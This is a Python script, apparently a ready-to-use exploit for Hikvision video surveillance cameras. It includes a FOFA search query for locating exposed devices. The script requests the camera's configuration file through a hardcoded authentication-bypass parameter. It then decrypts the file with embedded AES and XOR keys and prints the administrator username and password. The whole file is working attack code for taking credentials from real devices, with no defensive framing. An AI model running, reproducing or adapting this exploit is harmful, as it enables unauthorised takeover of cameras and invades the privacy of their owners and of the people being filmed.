#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
from itertools import cycle
from Crypto.Cipher import AES
import re
from io import BytesIO
from pathlib import Path


def title():
    print('+          FOFA:app="HIKVISION-视频监控"')


def add_to_16(s):
    while len(s) % 16 != 0:
        s += b'\0'
    return s


def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
    key = bytes.fromhex(hex_key)
    ciphertext = add_to_16(ciphertext)
    #iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")


def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))


def strings(file):
    chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
    shortestReturnChar = 2
    regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
    pattern = re.compile(regExp)
    return pattern.findall(file)


def vaild_target(target):
    regex = re.compile(
        r"(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$|(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9]+$")
    result = re.search(regex, target)
    if result:
        return result[0]
    else:
        return None


def param_to_list(param, method=""):
    list = set()
    path = Path(param)
    if path.exists() and path.is_file():
        with open(path, encoding='utf-8', errors='ignore') as file:
            for line in file:
                line = vaild_target(line.strip())
                list.add(line)
        return list
    else:
        list = param.split(',')
        return list


def enmuration(list, keyword='admin'):
    return [i for i, e in enumerate(list) if e == keyword]


def run_proto(url):
    con_list = [
        "/System/configurationFile?auth=YWRtaW46MTEK"]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    for con in con_list:
        vuln_url = url + con
        try:
            session = requests.session()
            session.trust_env = False
            resp = session.get(url=vuln_url, verify=False, headers=headers, timeout=(3, 3))
            if resp.status_code == 200:
                print(vuln_url + '\t sExist\n\n\n\n')
                with BytesIO(decrypt(resp.content)) as f:
                    xor = xore(f.read())
                result_list = strings(xor.decode('ISO-8859-1'))
                _index = enmuration(result_list)
                result = url + ',' + result_list[_index[-1]] + ',' + result_list[_index[-1] + 1]
                print(result)
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:8080')
    args = parse.parse_args()
    targ = args.url
    result = run(targ)

    if result:
        print('Exist')
    else:
        print('UnExist')
